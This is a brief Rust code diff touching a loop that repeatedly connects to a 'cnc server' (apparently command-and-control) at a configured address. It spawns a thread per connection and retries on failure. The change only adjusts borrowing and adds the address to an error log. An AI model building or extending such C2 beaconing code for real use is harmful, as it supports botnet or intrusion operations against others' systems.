@@ -43,7 +43,7 @@ fn run_server_loop() {
 fn run_cnc_connection_loop() {
     loop {
         let server_address = format!("{}:{}", CNC_SERVER_IP, CNC_SERVER_PORT);
-        match TcpStream::connect(server_address) {
+        match TcpStream::connect(&server_address) {
             Ok(stream) => {
                 info!("Successfully connected to cnc server {}!", stream.peer_addr().unwrap().to_string());
                 thread::spawn(move || {
@@ -52,7 +52,7 @@ fn run_cnc_connection_loop() {
                 });
             }
             Err(e) => {
-                error!("Failed to connect to cnc server, error: {}", e);
+                error!("Failed to connect to cnc server ({}), error: {}", &server_address, e);
             }
         }
         std::thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS))
